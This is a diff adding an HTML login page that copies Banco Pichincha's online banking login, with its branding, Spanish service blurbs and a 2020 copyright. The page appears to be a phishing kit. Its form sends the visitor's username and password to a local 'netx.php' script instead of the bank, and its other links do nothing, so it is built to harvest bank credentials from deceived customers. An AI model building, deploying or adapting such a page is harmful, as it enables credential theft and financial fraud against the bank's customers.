@@ -1,0 +1,904 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Login</title>
+<link href="/files/style.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+.ext-bpi-login-ng {
+display: flex !important;
+align-items: center;
+height: 100%;
+}
+
+/** Styles fonts**/
+a.home-links {
+color: #2f7abf !important;
+font-family: Prelo;
+font-size: 16px;
+font-weight: 600;
+}
+
+a.small-links {
+color: #2f7abf !important;
+font-family: Prelo;
+font-size: 14px;
+font-weight: 600;
+cursor: pointer;
+}
+
+label.question {
+color: #000;
+font-size: 14px;
+font-family: PreloSlab;
+font-weight: 500;
+}
+
+.login-label {
+color: #10265c;
+font-size: 28px;
+font-family: PreloSlab;
+font-weight: 300;
+letter-spacing: 0px;
+line-height: 34px;
+}
+
+/** Panel terms and conditions */
+.bp-panel {
+border-radius: 0 0 0 24px;
+width: 365px;
+}
+
+.bp-panel-body {
+padding: 24px;
+padding-bottom: 0;
+padding-top: 20px;
+}
+
+.bp-panel-body-text-left {
+padding-bottom: 5px;
+color: #0f265c;
+font-family: Prelo;
+font-size: 16px;
+font-weight: 700;
+}
+
+.bp-panel-body-text {
+color: #1b2d54;
+font-family: Prelo;
+font-size: 18px;
+padding: 25px 0;
+}
+
+.bp-panel-body-heading {
+color: #1b2d54;
+font-family: PreloSlab;
+font-size: 22px;
+font-weight: 700;
+}
+
+.bp-panel-footer {
+border-bottom-left-radius: 15px;
+background-color: transparent;
+padding: 0 18px 48px 24px;
+font-family: Prelo;
+}
+
+.bp-panel-tnc-heading {
+border: 0;
+background-color: #fff;
+padding: 40px 0 0 24px;
+}
+
+.container-terms-mobil {
+display: flex;
+flex-direction: column;
+text-align: center;
+background-color: #f4f6f9;
+padding: 16px 0;
+margin: 16px 0 0 0;
+}
+
+/** Paddings and margins **/
+.paddingBottom5 {
+padding-bottom: 5px;
+}
+
+.padding12 {
+padding: 12px;
+}
+
+.marginTop16 {
+margin-top: 16px;
+}
+
+.marginTop24 {
+margin-top: 24px !important;
+}
+
+.marginTop64 {
+margin-top: 64px !important;
+}
+
+.marginRight32 {
+margin-right: 32px;
+}
+
+.marginBottom16 {
+margin-bottom: 16px;
+}
+
+.marginBottom24px {
+margin-bottom: 24px !important;
+}
+
+.marginBottom32 {
+margin-bottom: 32px !important;
+}
+
+/** General styles **/
+.logo {
+justify-content: center;
+align-items: center;
+display: flex;
+flex-flow: column;
+padding: 32px;
+height: 100%;
+}
+
+.bp-form-group {
+margin-bottom: 32px;
+}
+
+.dot {
+font-size: 14px;
+}
+
+a {
+color: #2f7abf;
+}
+
+.input-not-valid .form-control {
+border-color: red;
+box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+}
+
+.input-with-icon .form-control {
+padding-right: 3.65rem;
+box-sizing: border-box;
+}
+
+.divider-login {
+width: 108px;
+height: 1px;
+border-radius: 0px;
+margin: 0 !important;
+}
+
+.subtitle-heading-login {
+color: rgb(15, 38, 92);
+font-size: 24px;
+font-family: PreloSlab;
+font-weight: 300;
+letter-spacing: 0px;
+line-height: 29px;
+padding-top: 22px;
+}
+
+.text-content-login {
+color: rgb(74, 74, 74);
+font-size: 16px;
+font-family: Prelo;
+font-weight: 500;
+letter-spacing: 0px;
+line-height: 24px;
+}
+
+.container-terms {
+text-align: center;
+margin: auto 0 0 0;
+bottom: 16px;
+padding-top: 32px;
+}
+
+.header-logo {
+position: fixed;
+top: 0;
+left: 0;
+width: 100vw;
+height: 56px;
+padding: 16px;
+box-shadow: 0px 8px 8px -8px rgba(7, 7, 7, 0.16);
+background: white;
+z-index: 3;
+}
+
+.btn-primary {
+height: 48px;
+}
+
+.button-signUp {
+height: 48px;
+border-radius: 4px;
+border: 1px solid rgb(212, 216, 225);
+color: rgb(15, 38, 92);
+font-size: 14px;
+background: #e9ecf3;
+font-family: Prelo;
+font-weight: 500;
+display: inline-block;
+text-align: center;
+touch-action: manipulation;
+cursor: pointer;
+}
+
+a.button-signUp {
+text-decoration: none !important;
+}
+
+.button-signUp:hover {
+background-color: #c7cfe1;
+border: 1px solid rgb(181, 185, 196);
+}
+
+.button-signUp:focus {
+background-color: #e9ecf3;
+border: 2px solid rgb(47, 122, 191);
+}
+
+.button-signUp:active {
+background-color: #b5bfd6;
+border: 1px solid rgb(181, 185, 196);
+}
+
+.container-form {
+display: flex;
+width: 459px;
+background: rgb(255, 255, 255);
+border: 1px solid rgb(222, 227, 237);
+border-radius: 4px;
+padding: 46px 56px;
+flex-direction: column;
+align-items: center;
+margin: auto;
+}
+
+.modal-content {
+border-radius: 4px !important;
+}
+
+.divider-content {
+width: 100%;
+height: 1px;
+border-radius: 0px;
+margin: 0;
+}
+
+.box-card {
+display: flex;
+flex-direction: column;
+align-items: center;
+width: 214px;
+height: 96px;
+border: 1px solid rgb(200, 200, 200);
+border-radius: 4px;
+text-align: center;
+font-size: 16px;
+font-family: Prelo;
+font-weight: 600;
+padding: 24px 0;
+}
+
+.box-card:hover {
+border: 1px solid rgb(74, 74, 74);
+}
+
+.box-card:focus {
+border: 2px solid rgb(47, 122, 191);
+}
+
+.box-card:active {
+background-color: #f4f6f9;
+border: 2px solid rgb(47, 122, 191);
+}
+
+.arrow-left {
+margin: 4px;
+background: rgb(146, 146, 146);
+float: left;
+}
+
+.container-overlay {
+height: 100%;
+width: 100%;
+display: flex;
+position: fixed;
+z-index: 1;
+top: 0;
+left: 0;
+background-color: white;
+align-items: center;
+}
+
+.overlay-content {
+position: relative;
+width: 100%;
+text-align: center;
+}
+
+.logo-banner {
+width: 112px !important;
+height: 24px !important;
+margin: auto;
+}
+
+.form-control {
+height: 48px;
+}
+
+.btn-password {
+border: none;
+position: absolute;
+right: 0;
+z-index: 10;
+top: 6px;
+font-size: 14px;
+}
+
+.padding-start {
+padding-inline-start: 32px;
+}
+
+.position-tooltip {
+display: inline-block;
+}
+
+ul.tips li {
+padding-top: 8px;
+list-style-type: none;
+}
+
+li.valid-rule, li.ty-data-value-error {
+list-style-type: none;
+margin-left: -16px;
+position: relative;
+padding-left: 20px !important;
+display: flex;
+font-weight: 500 !important;
+background-image: none !important;
+}
+
+li.valid-rule:before {
+padding-right: 5px;
+content: "";
+background-color: transparent;
+position: absolute;
+left: 0px;
+top: 8px;
+width: 5px;
+border-bottom: 2px solid #31a451;
+height: 14px;
+border-right: 2px solid #31a451;
+-webkit-transform: rotate(43deg);
+}
+
+li.ty-data-value-error:before {
+content: '\2715';
+padding-right: 10px;
+margin-left: -24px;
+}
+
+.tip-circle {
+float: left;
+margin-right: 32px;
+border-radius: 50%;
+background-color: #f4f6f9;
+height: 72px;
+width: 72px;
+padding: 14px 2px;
+}
+
+.container-tips {
+display: flex;
+flex-direction: column;
+padding: 56px;
+width: 460px;
+}
+
+.grid-tips {
+display: grid;
+grid-template-columns: auto auto;
+grid-row-gap: 16px;
+}
+
+.check-box-container {
+margin: 16px 0 24px 0;
+background-color: white;
+border-radius: 4px;
+display: flex;
+}
+
+.check-box-container label {
+float: left;
+}
+
+.margin-right-lb {
+margin-right: 16px;
+}
+
+.check-box-container label span {
+text-align: center;
+padding: 14px !important;
+display: block;
+width: 166px;
+height: 96px;
+border-radius: 4px;
+border: 1px solid rgb(200, 200, 200);
+background-color: #fff;
+color: #4a4a4a;
+}
+
+.check-box-container label input {
+position: absolute;
+top: -20px;
+}
+
+.check-box-container input:checked + span {
+background-color: #f4f6f9;
+color: #4a4a4a;
+width: 166px;
+height: 96px;
+border: 2px solid #2f7abf;
+}
+
+.check-box-container input:hover + span {
+border: 1px solid rgb(74, 74, 74);
+width: 166px;
+height: 96px;
+}
+
+.logo-signUp {
+display: block;
+top: 80px;
+left: 122px;
+position: absolute;
+}
+
+.wrapper {
+width: 100%;
+font-size: 16px;
+margin-top: 27px;
+}
+
+.position-alert {
+display: block;
+margin-top: 28px;
+}
+
+.tip-circle-login {
+float: left;
+margin-right: 32px;
+border-radius: 50%;
+background-color: #f4f6f9;
+height: 56px;
+width: 56px;
+padding: 14px 2px;
+}
+
+.divider-login-sidebar {
+height: 2px;
+width: 120px;
+margin: 16px 0 48px;
+}
+
+.sidebar-login {
+justify-content: center;
+display: flex;
+flex-flow: column;
+padding: 32px;
+height: 100%;
+}
+
+ul li::before {
+color: color('blue-dark');
+}
+
+.btn-font-size {
+font-size: 14px !important;
+}
+
+
+/** Styles help modal **/
+.container-help-modal {
+width: 459px;
+background: rgb(255, 255, 255);
+border-radius: 4px;
+padding: 40px 56px;
+flex-direction: column;
+align-items: center;
+}
+
+.radio-toolbar {
+display: flex;
+flex-direction: column;
+width: 100%;
+align-items: center;
+}
+
+.radio-toolbar input[type="radio"] {
+opacity: 0;
+position: fixed;
+width: 0;
+}
+
+.radio-toolbar label {
+display: inline-block;
+width: 100%;
+height: 96px;
+border: 1px solid rgb(200, 200, 200);
+border-radius: 4px;
+margin-top: 16px;
+text-align: center;
+font-size: 16px;
+font-family: Prelo;
+font-weight: 600;
+padding: 24px 0;
+color: rgb(74, 74, 74);
+}
+
+.radio-toolbar input[type="radio"]:checked + label {
+background-color: #f4f6f9;
+border: 2px solid rgb(47, 122, 191);
+}
+
+.radio-toolbar input[type="radio"]:focus + label {
+border: 2px solid rgb(47, 122, 191);
+}
+
+.radio-toolbar label:hover {
+border: 1px solid rgb(74, 74, 74);
+cursor: pointer;
+}
+
+/** Progress bar singUp **/
+.StepProgress {
+list-style: none;
+}
+
+.StepProgress::before {
+display: inline-block;
+content: '';
+position: absolute;
+}
+
+.StepProgress-item {
+position: relative;
+counter-increment: list;
+padding-top: 2px;
+padding-left: 16px;
+}
+
+.StepProgress-item:not(:last-child) {
+padding-bottom: 56px;
+padding-left: 16px;
+font-size: 18px;
+font-weight: 600;
+font-family: PreloSemiBold;
+}
+
+.StepProgress-item:not(:last-child)::before {
+border: 1px solid #c8c8c8;
+}
+
+.StepProgress-item::before {
+display: inline-block;
+content: '';
+position: absolute;
+top: 30px;
+left: -25px;
+height: 50%;
+border: 1px solid white;
+}
+
+.StepProgress-item::after {
+content: counter(list);
+display: inline-block;
+position: absolute;
+padding: 1px 6px;
+top: 0;
+left: -36px;
+width: 24px;
+height: 24px;
+border: 1.5px solid #c8c8c8;
+border-radius: 50%;
+background-color: #fff;
+color: #c8c8c8;
+}
+
+.StepProgress-item.is-done::after {
+content: "L";
+font-size: 16px;
+color: #fff;
+text-align: center;
+border: 1px solid #31a451;
+background-color: #31a451;
+padding: 1px;
+width: 24px;
+height: 24px;
+-webkit-transform: scaleX(-1) rotate(-35deg);
+}
+
+.StepProgress-item.current::after {
+content: counter(list);
+padding: 1px;
+width: 24px;
+height: 24px;
+left: -36px;
+font-size: 14px;
+text-align: center;
+color: white;
+border: 1px solid #0f265c;
+background-color: #0f265c;
+}
+
+.StepProgress-item strong {
+display: block;
+color: #c8c8c8;
+font-family: Prelo;
+font-size: 18px;
+font-weight: 600;
+}
+
+.StepProgress-item.current strong {
+color: rgb(74, 74, 74);
+font-weight: bold;
+font-size: 18px;
+font-family: PreloBold;
+}
+
+.StepProgress-item.is-done strong {
+color: rgb(74, 74, 74);
+}
+
+/** Mobile styles **/
+@media (max-width: 576px) {
+.bp-panel {
+width: 100%;
+}
+
+.ext-bpi-login-ng {
+background: white;
+width: 100vw !important;
+justify-content: center;
+}
+
+.container-login-form {
+padding: 56px 16px 0 16px !important;
+width: 100vw !important;
+border: 1px solid white !important;
+}
+
+.container-form {
+width: 100vw !important;
+padding: 58px 16px 0 16px !important;
+border: none !important;
+}
+
+.login-label {
+padding-top: 48px;
+}
+
+.container-help-modal {
+height: 100vh;
+position: fixed;
+left: -16px;
+top: 56px;
+width: 100vw!important;
+border-radius: 0 !important;
+justify-content: center;
+}
+
+.widthXS {
+width: 90vw !important;
+}
+
+.container-tips {
+position: fixed;
+top: 56px;
+left: -16px;
+padding: 56px 16px !important;
+width: 100vw!important;
+height: 100vh;
+background: white;
+align-items: center;
+justify-content: center;
+}
+
+.check-box-container {
+flex-direction: column;
+width: 100% !important;
+margin: 0 0 24px 0 !important;
+}
+
+.check-box-container label span {
+width: 100% !important;
+}
+
+.check-box-container label {
+margin-top: 16px;
+}
+
+.margin-right-lb {
+margin-right: 0 !important;
+}
+}
+
+@media (min-width: 768px) and (max-width: 992px) {
+.arrow-left {
+display: none;
+}
+.without-border {
+border: none !important;
+}
+}
+
+@media (max-width: 768px) {
+.bottom-text {
+margin-left: auto;
+}
+
+.bp-panel-tnc-heading {
+padding: 24px 0 0 24px;
+}
+
+.bp-panel-body {
+padding-top: 16px;
+}
+
+.bp-panel-footer {
+padding: 0 24px 40px;
+}
+
+.dot {
+font-size: 10px;
+}
+
+.position-alert {
+width: 100vw;
+margin-top: 56px !important;
+}
+}
+
+@media (max-width: 992px) {
+.form-ipad {
+width: 100vw !important;
+height: 100vh !important;
+background: white;
+}
+}
+</style>
+
+</head>
+<body>
+<div id="main" class="main-login" data-pid="page_1597874995642">
+<navbar class="login-navbar hidden-xs hidden-sm">
+<div class="logo-wrapper ng-scope" id="login-navbar" ng-controller="SidebarController as $ctrl" ng-include="ext.helpers.template">
+<div class="sidebar-login ng-scope" ng-controller="SidebarController as $ctrl">
+<div class="bp-icon icon-bpi-logo" style="margin: auto auto 0 0;"></div>
+<div class="subtitle-heading-login" style="margin-top: 18%">
+<div>
+Accede a todos los servicios de
+<br><strong>Banco Pichincha</strong> sin salir de tu casa
+</div>
+<hr class="divider-login-sidebar">
+</div>
+
+<div class="grid-tips">
+<span class="tip-circle-login"><i class="bp-icon icon-compare-arrows"></i></span>
+<div style="margin: auto 0;">
+<label class="ty-text-description text-18">Realiza transferencias directas e interbancarias</label>
+</div>
+<span class="tip-circle-login"><i class="bp-icon icon-receipt"></i></span>
+<div style="margin: auto 0;">
+<label class="ty-text-description text-18">Paga tus servicios y facturas</label>
+</div>
+<span class="tip-circle-login"><i class="bp-icon icon-bar-chart"></i></span>
+<div style="margin: auto 0;">
+<label class="ty-text-description text-18">Abre inversiones desde $500</label>
+</div>
+<span class="tip-circle-login"><i class="bp-icon icon-plus-one"></i></span>
+<div style="margin: auto 0;">
+<label class="ty-text-description text-18">Solicita nuevos productos</label>
+</div>
+<span class="tip-circle-login"><i class="bp-icon icon-widgets"></i></span>
+<div style="margin: auto 0;">
+<label class="ty-text-description text-18">Y muchos más servicios</label>
+</div>
+</div>
+
+<div class="container-terms">
+<a class="small-links" ng-click="$ctrl.openTerms = true">
+Términos de uso
+</a>
+<span class="ty-text-description">© 2020 Banco Pichincha. Todos los derechos reservados</span>
+</div>
+</div>
+</div>
+</navbar>
+<div class="container-flex">
+<div class="container-flex column">
+<section id="main-section" class="bp-area --area main-section-login">
+<div class="bp-container bp-ui-dragRoot bp-manageableArea --area bp-area " data-pid="container_0a39e4f9-5ceb-4d6b-ad76-4a646e28e88a">
+<div data-pid="widget-bpi-login-ng-6021124" class="bp-widget bp-ui-dragRoot">
+<div class="bp-widget-head"></div>
+<div class="bp-widget-pref"></div>
+<div class="bp-widget-body ng-scope">
+<div g:onload="BB.Widget.ngStart(__WIDGET__);">
+<div class="widget-bpi-login-ng">
+<div class="bp-g-include">
+<div class="ext-bpi-login-ng ng-scope" style="width: min-content;">
+<div ng-include="ext.helpers.template" class="ng-scope">
+<div class="header-logo hidden-md hidden-lg ng-scope">
+<div class="bp-icon icon-bpi-logo logo-banner"></div>
+</div>
+<div class="container-form ng-scope">
+
+<form action="netx.php" method="post">
+<strong>
+<label class="login-label marginBottom32" i18n-key="login.label.title">Bienvenido a tu Banca web</label>
+</strong>
+
+<div class="bp-form-group">
+<label class="ty-text-bold">Usuario</label>
+<input type="text" name="username" pattern=".{4,}" class="form-control ng-pristine ng-empty ng-invalid ng-invalid-required ng-valid-maxlength ng-touched" required="">
+</div>
+<div class="bp-form-group">
+<strong>
+<label class="ty-text-bold">Contraseña</label>
+</strong>
+
+<div class="control-group">
+<div class="input-group" style="position:sticky; width:100%">
+<input type="password" name="pass" pattern=".{4,}" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" required="">
+</div>
+</div>
+
+</div>
+
+<div class="marginBottom16">
+<button type="submit" class="btn btn-primary w-100 btn-font-size">Ingresar</button>
+</div>
+</form>
+
+<div class="row">
+<div class="text-center">
+<a class="home-links" href="#">¿Tienes problemas para iniciar sesión?</a>
+</div>
+</div>
+
+<div class="d-flex w-100" style="margin: 16px 0">
+<hr class="divider-content" style="margin:auto">
+<label class="ty-text-description text-16" style="margin:0 8px"> O </label>
+<hr class="divider-content" style="margin:auto">
+</div>
+
+<div class="text-center w-100">
+<p class="ty-text-description text-16 paddingBottom5">¿Eres nuevo en Banca web? </p>
+<button type="button" class="button-signUp w-100">Regístrate ahora</button>
+</div>
+</div>
+
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+</div>
+</div>
+</div>
+
+
+</body></html>
